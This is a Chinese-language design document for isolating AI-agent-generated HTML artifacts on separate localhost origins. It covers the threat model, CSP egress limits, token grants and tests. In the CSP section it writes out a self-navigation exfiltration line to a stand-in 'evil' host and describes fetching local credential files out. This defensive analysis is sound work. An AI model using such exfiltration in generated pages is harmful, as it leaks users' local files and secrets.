# Artifact Origin：制品与轻应用的独立源渲染

## 目标

- Agent 写的 HTML 制品和轻应用在一个**真实但独立的 origin** 里运行，浏览器原生能力（localStorage / IndexedDB、下载、全屏、指针锁定、权限类 API、相对路径读同目录资源）全部可用，不再靠宿主页逐个 API 造桥。
- 隔离交给浏览器的同源策略而不是 sandbox 标志：制品 JS 永远碰不到应用 origin 的 cookie、`/api`、`/ws` 和宿主 DOM。
- 制品同目录的资产文件（模型、字体、音视频、脚本、样式）能被页面直接引用，`./duck.glb`、`./app.js`、`./chart.png` 这种相对路径直接工作，宿主不再做任何内联和序列化。
- 只有一条渲染路径。HTML 制品和轻应用要么在独立源里完整运行，要么明确告知"仅本机可用"，没有降级形态。

## 非目标

- 不保留 opaque srcdoc 沙箱作为 HTML 的回退路径。`selfContainedDocument`、`stripExternalRefs`、`inlineLocalRefs` 的 document 模式、`withStrippedBanner` 以及 `withLaBridge` 随本方案删除。
- 不给 srcdoc iframe 加 `allow-same-origin`。srcdoc 继承父页面 origin，加了等于把访问密钥交给制品脚本。
- **Mobile 不做制品和轻应用。** 手机端（含经 tunnel 访问的场景）没有第二个 origin 可用，`web/src/mobile/` 下的制品入口整体移除，不做替代形态。
- 不做 CDN 服务端缓存代理（外链策略里挂起的 C 案维持挂起）。
- 不支持多页面 HTML bundle：一个 grant 只服务一个入口 HTML，同目录里的其他 `.html` 不在资产表内。
- 不做写权限。制品源只有 GET。
- Markdown 制品不迁移：它的预览是宿主自己渲染的，没有 agent 脚本，留在 srcdoc 沙箱即可，图片继续走 `inlineLocalRefs` 的 fragment 模式。

## 威胁模型

保护对象和现在一样：**agent 生成的 HTML 一律视为不可信**。prompt injection 可以让 agent 写出任意页面，用户在侧栏里点开看一眼就会执行它的脚本。这段脚本绝不能成为"已登录的用户"。

今天的应用 origin 里有什么：

- 访问密钥是前端用 `document.cookie` 写的（`web/src/lib/auth.ts`），不是 HttpOnly，同源脚本直接读。
- `POST /api/chat/{id}/turn` 之类的路由能驱动 agent 跑 terminal；`/api/config/endpoints` 能换模型和 base_url；桌面端还有 `/api/native/self-update`、`open-external`、`save-file`。

现有防线是 opaque origin：制品"谁也不是"，所以什么都碰不到，代价是浏览器把所有有归属的能力也一起收走。本方案换成独立 origin 后，防线由两条互相独立的规则构成，任一条单独失效都不会开口子：

1. **制品源上没有 API。** Host 分流在最外层 handler 上做，`*.artifacts.localhost` 和 `*.apps.localhost` 只会进制品源 handler，`/api/*`、`/ws`、静态 UI 在这些 Host 上一律 404。
2. **制品源的 Origin 在应用源上是外人。** `isLocalName`（`internal/server/auth.go`）只认 `localhost` 和回环 IP 字面量，`x.artifacts.localhost` 天然不匹配。制品脚本跨源打 `http://127.0.0.1:8088/api/...`，请求带 `Origin: http://x.artifacts.localhost:8088`，`requireAuth` 走回环豁免时被 `originAllowed` 拒掉，返回 403 forbidden origin。这正是现有的 CSRF 门，不新增判定，只加测试钉死。
3. cookie 是 host-only 的。`auth.ts` 写 cookie 不带 `Domain` 属性，浏览器不会把它发给 `*.localhost` 子域。

Token 泄漏为什么不构成风险：制品源的主机名只在**本机**解析到回环，CDN 运营者从 `Origin` / `Referer` 头里拿到 token 也无处可用；本机进程本来就在信任边界之内（`SECURITY.md` "Loopback is trusted"）。LAN 绑定（`--addr :8088`）下，攻击者伪造 `Host: <token>.artifacts.localhost` 直连 LAN IP 这条路，由制品源 handler 要求 `isLocalPeer`（回环 peer 且无转发头）关掉。

残余风险（接受）：

- **cookie tossing。** `localhost` 不在 Public Suffix List 里，`x.artifacts.localhost` 上的脚本可以写 `Domain=localhost` 的 cookie，浏览器会把它带给 `localhost:8088`。它能做到的只是给应用请求塞垃圾 cookie 或用假值遮住 `octo_access_key`；被遮住后 `validateAccessKey` 失败，请求落到回环豁免仍然通过，所以在唯一能拿到制品源的环境（本机）里没有实际影响。桌面端加载的是 `127.0.0.1:8088`，IP 主机不受 Domain cookie 影响。
- **同机进程读制品目录。** 与现状一致，本机进程可以不带密钥调 `/api`，制品源不扩大这个面。

## 第二个 origin

### 主机名

| 用途 | Host | origin 粒度 |
|---|---|---|
| 会话制品 | `<token>.artifacts.localhost:<port>` | 每个 grant 一个 origin，制品之间存储互相隔离 |
| 轻应用 | `<slug>.apps.localhost:<port>` | 每个应用一个**稳定** origin，localStorage 跨会话持久 |

`*.localhost` 按 RFC 6761 解析到回环：Chrome、Firefox 内建；macOS 系统解析器实测通（`curl http://foo.localhost:8088/api/health` 返回 200），Safari 和 WKWebView 走系统解析器；Windows WebView2 是 Chromium 内核。端口取自请求的 `Host` 头，桌面端固定 8088、测试用临时端口都不需要额外配置。

没有选 `localhost` 与 `127.0.0.1` 互为第二源：两者都是 `isLocalName`，要改回环豁免的语义才能把它们分开，而且只得到一个所有制品共用的 origin，制品之间不隔离。

因为没有回退路径，**三个桌面平台的 webview 都能解析 `*.localhost` 是阶段 2 的前置条件**，不是验收里可以打叉的一项。macOS 已实测通过系统解析器；WebView2（Windows）和 webkitgtk + systemd-resolved（Linux）在动手前先用一个空 Wails 窗口各验一次。若某平台不通，应急方案是该平台的应用加载 `127.0.0.1` 而制品统一走 `localhost`（单一共享 origin，制品之间不隔离，`isLocalName` 需要按平台收窄），这是退而求其次，不是默认。

### 可用性判定

判定在服务端：grant 接口只对 `isLocalRequest(r)` 为真的客户端发 token（回环 peer、无转发头、本地 Host）。tunnel 走 `X-Octo-Forwarded`，ngrok / cloudflared 带 `X-Forwarded-*`，LAN 客户端不是回环 peer，三种情况都拿不到 grant，前端把该制品显示为"预览仅在本机可用"，代码视图照常。`ssh -L` 这种字节级等同本地的转发会拿到 grant，但制品源主机名在远端浏览器上解析到远端自己的回环，iframe 加载失败，前端探测到后显示同一条提示。

## 服务端

### Host 分流

`s.http.Handler` 从 `s.corsMiddleware(s.mux)` 变为 `s.hostRouter(s.corsMiddleware(s.mux))`。`hostRouter` 只看 `canonicalHost(r.Host)`：后缀是 `.artifacts.localhost` 或 `.apps.localhost` 的进 `artifactOriginHandler`，其余原样透传。制品源 handler 内部不走 `requireAuth`，也不会碰到 `s.mux`。

### Grant

```
POST /api/sessions/{id}/artifacts/grant      （经 s.api 注册，requireAuth 保护）
body: { "path": "<abs path of the html artifact>" }
200: { "url": "http://<token>.artifacts.localhost:8088/", "expires_at": "..." }
409: { "error": "artifact origin unavailable" }   非 isLocalRequest 客户端
404: 路径不是本会话写的 / 不是 html
```

- 路径校验完整复用 `handleGetArtifact` 的三段：`tools.ArtifactContentType` 判类型（只接受 html）、`resolveArtifactPath` 拒相对路径、`sessionWrotePath` 查 transcript。
- token 是 16 字节 `crypto/rand` 的 hex（32 个字符，合法 DNS label）。
- grant 记录 `{sessionID, entry, root, createdAt}`，`root = filepath.Dir(entry)`，存在 `Server` 上的内存 map，服务重启即失效。同一 `(sessionID, entry)` 重复申请返回同一 token，agent 重写文件后前端只需刷新 iframe，origin 不变、存储保留。
- 过期：24 小时滑动窗口，过期的 grant 由下一次申请顺手清理。过期只是卫生，不是安全属性（见威胁模型）。

### 制品源 handler

`GET /` 和 `GET /index.html` 返回入口 HTML；其他 `GET /<rel>` 返回 `root` 下的资产。

- 只接受 GET / HEAD；必须 `isLocalPeer(r)`，否则 403。`isLocalPeer` 是 `isLocalRequest` 去掉 Host 检查：制品源的 Host 按定义不是本地名，照 `isLocalRequest` 判会恒 403，剩下的两个信号（回环 peer、无转发头）就是判据。
- token 未知或已过期 → 404，不区分原因。
- `rel` 经 `path.Clean` 后不得以 `..` 开头；拼出的绝对路径 `filepath.EvalSymlinks` 之后必须仍在 `root` 之内（符号链接不能把目录带出去）。
- 扩展名必须在资产表内（下节）；`.html` / `.htm` 不在表内，因此只有入口那一份 HTML 会被服务。
- 入口 HTML 上限 64 MB（`artifactEntryMaxBytes`），上限只因为 gate 要把整文件读进内存解析；旧的 10 MB 是为 srcdoc 时代的 base64 膨胀和属性副本付的账，独立源上不存在，而把数据内联进页面的轻应用现实中已有 12 MB 的，旧 JSON 端点本来就不限。**资产没有上限**：`http.ServeContent` 流式发出并支持 Range，一个几百 MB 的模型或录像是用户自己磁盘上的文件经回环发给用户自己的浏览器，限它没有理由。
- 响应头：按扩展名的 `Content-Type`、`X-Content-Type-Options: nosniff`、`Cache-Control: no-store`、`Referrer-Policy: no-referrer`、`Origin-Agent-Cluster: ?1`、以及下一节的 `Content-Security-Policy`。**不发** `Content-Security-Policy: sandbox`，这一头留给旧的 `/api/sessions/{id}/artifacts` 直开端点。

### 出网边界：CSP

同目录放行让页面能读到入口目录下的所有资产类型文件，比旧管线（只内联本会话写过的图片）宽得多；如果页面还能任意出网，一个被注入的制品就能把 `./service-account.json`、`./data.csv` 这类文件 `fetch` 出去。所以制品源和轻应用源的每个响应都带同一条 CSP（`internal/server/artifact_gate.go` 的 `artifactCSP`，从 CDN 白名单生成）：

```
default-src 'self' data: blob: https://cdn.bootcdn.net https://cdn.jsdelivr.net …;
script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: <同一组 CDN>;
style-src  'self' 'unsafe-inline' data: blob: <同一组 CDN>;
form-action 'self'; base-uri 'self';
frame-ancestors http://localhost:* http://127.0.0.1:*
```

- 白名单从"gate 剥静态引用 + 提示模型的软约束"变成浏览器执行的硬边界：fetch / XHR / WebSocket / beacon / 图片 / 字体 / 媒体 / worker / 动态插入的脚本，一律只能指向自己的 origin 和白名单 CDN。
- `'unsafe-inline'` 和 `'unsafe-eval'` 只给 script 和 style：页面自己的代码天然是内联的，库要编译模板和 WebAssembly。这条 CSP 是出网边界，不是 XSS 防线，XSS 防线是同源隔离。
- 代价是页面不能再调用任意公网 API、不能加载任意外部图片。这与白名单的初衷（离线、国内、防腐烂）一致，提示词和 skill 明确告知模型：数据要放在页面里或同目录文件里。
- **关不掉的一条**：frame 自导航（`location.href = 'https://evil/?' + data`）。CSP 没有 navigate-to 指令，sandbox 只禁顶层导航。`form-action 'self'` 关掉了表单提交这一形态，`location` 形态保留。它是可见的（frame 里的页面消失）且只能带 URL 长度以内的数据。接受并记录在 `SECURITY.md`。

`frame-ancestors` 里没有 `[::1]`：CSP 的 host-source 语法没有 IPv6 字面量形式，写进去整条指令会被浏览器丢弃。后果是从 `http://[::1]:8088` 打开的 UI 嵌不了这个 frame，所以 grant 接口对 IPv6 字面量 Host 的请求直接回 409，轻应用面板对 `location.hostname` 含冒号的情况同样显示"仅在本机可用"，而不是让浏览器静默拦掉一个空白 frame。

`frame-ancestors` 限制只有本机的应用页能嵌它，防止外部网页把轻应用套进自己的 iframe 做 clickjacking；直接在新标签页里打开 `url` 是顶层导航，不受影响，而且 JS 全跑。这顺带修掉了"open in new tab 什么都不动"的老问题。

### 资产扩展名表

`internal/tools/artifact.go` 旁新增 `artifactAssetContentTypes`，与 `artifactContentTypes`（面板可预览类型）分开，这样 `.bin`、`.wasm` 不会出现在制品列表里：

- 图片：复用 `artifactContentTypes` 里的六种
- 样式脚本数据：`.css` `.js` `.mjs` `.json` `.wasm` `.csv` `.txt` `.xml`
- 3D：`.glb` `.gltf` `.bin` `.obj` `.mtl` `.hdr`
- 字体：`.woff` `.woff2` `.ttf` `.otf`
- 媒体：`.mp3` `.wav` `.ogg` `.mp4` `.webm`

同目录放行的依据：写入口 HTML 的目录就是 agent 的产出目录，与现有 `inlineLocalRefs` 只内联"同目录图片"的规则同源，只是不再限于图片；扩展名表把 `.env`、`.pem`、`.key`、`.md`、`.html` 这类不属于页面资产的文件排除在外。只读、限类型、带 token、只在本机可解析，四条一起构成边界。

### Go 侧 CDN 白名单

入口 HTML 由服务端直接发出，白名单剥离从前端挪到 Go，成为唯一实现：

- 用 `golang.org/x/net/html`（已在 `go.mod`）解析后判定，与被删除的 `stripExternalRefs` 同一原则：`<script src>`、`<link rel>` 含 `stylesheet` / `preload` / `modulepreload` 的 `href`，`https:` 且 hostname 在白名单内才保留；`data:` / `blob:` / `#` / 空值原样保留，相对路径**保留**（这正是本方案要打开的能力）。
- 剥了才重新序列化，没剥就原字节透传。
- 横幅样式沿用今天的 `withStrippedBanner`，主题由 iframe `src` 上的 `?theme=dark|light` 决定，前端在主题切换时更新 `src`。
- 白名单常量只在 Go 里（`internal/server/artifact_gate.go`），前端 `CDN_ALLOWLIST` 随 `stripExternalRefs` 删除。`internal/prompt/base.md` 和 `artifact-design` SKILL.md 里的名单仍按现状手工同步。<!--lint:new-->

### 轻应用源

`GET http://<slug>.apps.localhost:<port>/` 服务 `~/.octo/light-apps/<slug>/index.html`，`GET /<rel>` 服务同目录资产，规则与制品源相同（`isLocalPeer`、扩展名表、大小上限、符号链接检查、同一组响应头、同一份 Go 白名单 gate）。slug 校验沿用 `handleGetLightApp` 的规则（非空、不含 `..` 和路径分隔符）。

不需要 token：轻应用是用户明确保存的内容，目录对本机进程本来可读；而稳定的主机名正是它的价值，应用的 localStorage 跨会话、跨版本持久，且与其他应用天然隔离。

保存轻应用带资产不需要新工具：agent 用 `write_file` 把文件写进 `~/.octo/light-apps/<slug>/` 即可，页面里用相对路径引用。

## 前端

### 渲染路径

`Artifact` 类型新增 `originURL?: string`。`hydrateArtifact` 对 html 类型只做一件事：调 `POST .../artifacts/grant`。成功则记录 `originURL`；409 或网络失败则标记 `originUnavailable`。不再构建 srcdoc 预览。`code` 视图仍从旧端点取文本。

面板、Modal 两处 iframe 收进一个 `ArtifactFrame.svelte`：

```
<iframe src={originURL + '?theme=' + theme + '&v=' + rev}
        sandbox={ARTIFACT_ORIGIN_SANDBOX} allow="fullscreen; clipboard-write">
```

```ts
export const ARTIFACT_ORIGIN_SANDBOX = 'allow-scripts allow-same-origin allow-forms allow-modals allow-downloads allow-pointer-lock'
```

`src` 是跨源页面，`allow-same-origin` 在这里只是"让它做自己"，隔离由同源策略保证；仍然保留 `sandbox` 是为了继续禁 `allow-popups` 和 `allow-top-navigation`，这两条保护的是宿主标签页不被制品劫持，与 origin 无关。

`v` 参数在 agent 重写同一路径时递增，强制 iframe 重新加载；origin 不变，存储保留。

Markdown 预览继续用 srcdoc iframe，sandbox 常量沿用 `ARTIFACT_SANDBOX`（含 `allow-pointer-lock`），`allow="fullscreen; clipboard-write"` 与独立源 frame 一致。

### 不可用时的表现

`originUnavailable` 的制品在预览区显示一条固定提示"预览仅在本机可用"，`code` 视图和下载按钮不受影响。`ArtifactFrame` 监听 iframe `load` 后做一次跨源可达性探测（`fetch(originURL, {mode:'no-cors'})` 出错即视为不可达），覆盖 `ssh -L` 一类拿到 grant 但主机名解析不通的情况，命中后同样标记 `originUnavailable`，当前页面生命周期内不再申请 grant。

### 轻应用

轻应用 iframe 用 `http://<slug>.apps.localhost:<port>/`，`port` 取 `location.port`。`localAccess`（`/api/version` 的 `local` 标志）为假时，轻应用面板显示同一条"仅在本机可用"提示，不渲染。

### Mobile

移除 `web/src/mobile/ArtifactViewer.svelte`，`web/src/mobile/ChatDetail.svelte` 里的制品列表区块和 `viewArtifact` 状态，以及 `web/src/mobile/chatWiring.ts` 里对制品 store 的接线。手机端消息流里制品仍作为工具调用结果出现（文件路径），只是没有预览。

## 对内联管线的影响

宿主不再对入口 HTML 做任何"自包含化"处理，页面按原样从服务端加载：

- **本地 JS / CSS 不再被剥、不再需要内联。** 今天 `stripExternalRefs` 把 `<script src="./app.js">` 和 `<link href="./style.css">` 当作外链一并剥掉，agent 只能把脚本和样式全部写进一个 HTML。独立源上它们是同目录资产，浏览器直接请求。
- **图片不再序列化成 data: URI。** `<img src="chart.png">`、`background-image: url(bg.png)`、`<img srcset>` 全部按普通 URL 加载。随之消失的还有 `inlineRefBudget`（6 MB）、`inlineRefMax`（40 个文件）和内存开销（base64 的 1.37 倍、UTF-16 再翻倍、srcdoc 属性再存一份）。图片和其他资产流式服务，不设上限。
- **白名单外链的剥离仍然存在**，只是唯一实现在 Go gate，规则不变。

`web/src/lib/artifacts.ts` 里随之删除：`ARTIFACT_SANDBOX` 之外的 HTML 专用部分，即 `CDN_ALLOWLIST`、`isAllowedRef`、`stripExternalRefs`、`withStrippedBanner`、`selfContainedDocument`、`inlineLocalRefs` 的 `'document'` 模式及其 CSS `url()` 改写。fragment 模式（Markdown 图片）保留。

## 桥的退役

独立源上 `localStorage` 和下载都是原生的。

- **存储桥整个删除，数据做一次迁移。** 现有数据在宿主 origin 的 IndexedDB `octo-la-storage` 里按 slug 分命名空间。某 slug 第一次以独立源打开时，宿主把该命名空间的全部键值 `postMessage` 给 iframe，服务端注入在 `index.html` 末尾的一段一次性脚本收到后写入真 `localStorage`，回执后宿主在 IndexedDB 里记一条"已迁移"元数据。迁移完成后 `laStorage.ts` 只剩迁移发送端，桥的 shim、注册表与命名空间校验一并删除。原 IndexedDB 数据保留一个版本周期后再清。
- **下载桥保留于桌面端。** 桌面 webview 没有下载委托（`laDownload.ts` 头注释与 `native_handlers.go` 的 `SaveFile`），`allow-downloads` 在那里仍是静默无效，所以 `nativeShell` 为真时下载桥脚本由服务端注入到独立源页面（与迁移脚本同一注入点）。浏览器里的独立源页面不注入任何脚本。

## 文档与提示词同步

- `internal/prompt/base.md` "Constraints on index.html"：删掉"Runs in a sandboxed iframe with no same-origin access ... no cross-origin fetch from scripts"和"Prefer inlining CSS and JS"两条，换成两句：页面可以用相对路径引用同目录下的文件（脚本、样式、图片、字体、模型、媒体），`.html` 除外；页面的网络被 CSP 限在自身文件和白名单 CDN，数据要放在页面里或同目录文件里。不再让模型判断使用环境。
- `internal/skills/defaults/artifact-design/SKILL.md` 与 base.md 同步改，涉及四处：frontmatter description 里的"sandboxed iframe"改为"separate origin"；"How the panel actually works" 的第一条 **Sandboxed, not sandboxed-privileged** 整条重写为：页面跑在自己的独立 origin 上，`localStorage` / IndexedDB / 下载 / 全屏 / 指针锁定原生可用，但它是应用之外的另一个源，碰不到宿主 cookie 和 `/api`；第二条 **External references are allowlist-gated** 删掉"Still default to inlining ... Embed images as `data:` URIs"那段，改为同目录文件直接用相对路径引用，`data:` URI 不再是默认；"Self-contained checklist" 改名为 "Before you write"，删掉"everything else is inlined in one `<style>`/`<script>` block"和"Any image is a `data:` URI or omitted"两项，换成"本地资源用相对路径且文件确实在入口 HTML 同目录下"。**Theme support is one-directional** 一条不动：`?theme=` 只喂给 Go gate 的横幅，不承诺给页面。`references/charts.md` 与 `references/palette.md` 不涉及沙箱，不动。
- `SECURITY.md` "What is defended" 表加两行：agent 生成的 HTML（prompt injection 可写出）在独立源 `*.artifacts.localhost` / `*.apps.localhost` 上运行，制品源上没有 API，其 Origin 被 CSRF 门拒绝；页面对同目录文件的读取被 CSP 限制为只能送往自身 origin 和白名单 CDN，frame 自导航这一残余通道明文记录。
- `dev-docs/web-artifacts-panel-design.md` "Rendering security" 与 `dev-docs/light-apps-design.md` "运行沙箱 / 运行时存储 / 运行时下载" 改写为本文档描述的状态；两处关于 mobile 制品预览的描述删除。
- `dev-docs/serve-auth-design.md` 威胁模型表加"制品源脚本跨源调 API"一行，防线是 `originAllowed`。
- 用户文档 `docs/src/content/docs/guides/light-apps.mdx` 与 `docs/src/content/docs/zh/guides/light-apps.mdx`：目录树注释"自包含页面（不依赖 CDN、不请求外部资源）"、"运行在浏览器的 sandboxed iframe 里"、生成规则里的"完全自包含：不能引用 CDN、不能请求外部图片、不能跨域 fetch"和"CSS 和 JS 都内联"四处改写为独立源的描述（可引用白名单 CDN、可用相对路径引用同目录文件、`localStorage` 原生持久），并加一句"仅在本机可用，手机端不提供"。这两页在 CDN 白名单落地时就已经过时，本次一并修。

## 分阶段

### 阶段 1：沙箱标志补齐

`allow-pointer-lock` 与 `allow="fullscreen"` 并入阶段 2 的 `ARTIFACT_ORIGIN_SANDBOX` 和 Markdown 预览的 `ARTIFACT_SANDBOX`，不单独发 PR：阶段 2 同时删除 HTML 的 srcdoc 路径，单独给它打标志只能活几天。

### 阶段 2：制品独立源 + 删除 srcdoc HTML 路径 + Mobile 移除

前置：WebView2 与 webkitgtk 对 `*.localhost` 的解析各用空 Wails 窗口验一次通过。

服务端 `hostRouter`、grant 接口、制品源 handler、资产表、Go 白名单 gate；前端 `ArtifactFrame`、grant 调用与不可用提示、TS 自包含管线删除、mobile 制品入口删除。

验收（安全部分是硬门，缺一不合）：

- 回环 peer 带 `Origin: http://x.artifacts.localhost:8088` 打任意 `/api` → 403 forbidden origin；带该 Origin 且带正确密钥 → 200（密钥优先的既有精度不变）。
- `Host: x.artifacts.localhost:8088` 请求 `/api/health`、`/ws`、`/`、`/assets/...` → 404。
- 非回环 peer 或带转发头的请求打制品源 → 403；grant 接口对这类客户端 → 409。
- `rel` 含 `..`、符号链接指向 root 之外、扩展名不在表内、超过上限 → 404 / 413。
- 会话未写过的 html、被拒绝的写入、伪造成功的 tool_result 申请 grant → 404（复用 `artifact_handler_test.go` 的四组 fixture）。
- Go gate 对现有 `artifacts.test.ts` 里 `stripExternalRefs` 的 fixture（含诱饵属性、引号内 `>`、`<script/src=…>`）判定一致，fixture 随实现移到 Go 测试。
- 端到端：three.js 探针（importmap 走 CDN、`GLTFLoader.load('./duck.glb')`、`<script src="./app.js">`、`<img src="./chart.png">`、`localStorage.setItem`、`<a download>`、`requestFullscreen`）在制品源 iframe 里全过；带 `X-Octo-Forwarded` 的 serve 下同一制品显示"预览仅在本机可用"，代码视图正常。
- `web/src/mobile/` 下不再引用 `artifacts` store 与 `ArtifactViewer`。

### 阶段 3：轻应用独立源与桥退役

轻应用源 handler、存储迁移、存储桥删除、下载桥收缩到桌面端注入。验收：已有轻应用的存量数据迁移后可读；同一应用刷新、重开、服务重启后 `localStorage` 仍在；两个应用互相读不到对方的键；`localAccess` 为假时轻应用面板显示"仅在本机可用"。

## 涉及文件

服务端：

- `internal/server/server.go`：`hostRouter` 接入、grant 路由
- `internal/server/artifact_origin.go`：新增，分流、grant、制品源与轻应用源 handler、桌面端注入脚本 <!--lint:new-->
- `internal/server/artifact_gate.go`：新增，Go 白名单剥离与横幅 <!--lint:new-->
- `internal/tools/artifact.go`：资产表
- `internal/server/auth.go`：不改逻辑，只加测试

前端：

- `web/src/lib/artifacts.ts`：`originURL` / `originUnavailable`、grant 调用、`ARTIFACT_ORIGIN_SANDBOX`；删除 HTML 自包含管线
- `web/src/lib/api.ts`：grant 请求
- `web/src/components/ArtifactFrame.svelte`：新增
- `web/src/components/ArtifactsPanel.svelte`、`web/src/components/ArtifactModal.svelte`：换用 `ArtifactFrame`，不可用提示
- `web/src/mobile/ArtifactViewer.svelte`：删除；`web/src/mobile/ChatDetail.svelte`、`web/src/mobile/chatWiring.ts`：移除制品接线
- `web/src/lib/laStorage.ts`：收缩为迁移发送端；`web/src/lib/laDownload.ts`：脚本改由服务端注入

文档：`SECURITY.md`、`internal/prompt/base.md`、`dev-docs/web-artifacts-panel-design.md`、`dev-docs/light-apps-design.md`、`dev-docs/serve-auth-design.md`。
